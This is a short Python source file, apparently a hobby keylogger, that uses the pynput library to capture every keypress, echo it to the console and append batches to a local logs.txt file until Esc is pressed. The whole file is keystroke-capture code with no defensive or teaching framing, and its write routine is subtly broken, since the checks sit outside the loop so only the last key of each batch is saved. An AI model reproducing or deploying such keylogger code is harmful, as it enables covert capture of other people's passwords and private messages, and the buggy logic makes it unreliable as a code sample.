import pynput
from pynput.keyboard import Key, Listener
word_counter = 0
keys = []


def on_press(key):
    global word_counter, keys
    keys.append(key)
    word_counter += 1
    print(f'{key} pressed')
    if word_counter >= 5:
        word_counter = 0
        write_file(keys)
        keys = []


def write_file(key_arr):
    with open("logs.txt","a") as f:
        for key in key_arr:
            ke = str(key).replace("'","")
        if ke.find("space") > 0:
            f.write(' ')
        if ke.find("enter") > 0:
            f.write('\n')
        if ke.find("Key") == -1: #Finding other keys
            f.write(ke)


def on_release(key):
    if key == Key.esc:
        with open("logs.txt", "a") as file:
            file.write('\n\n')
        return False


with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join()
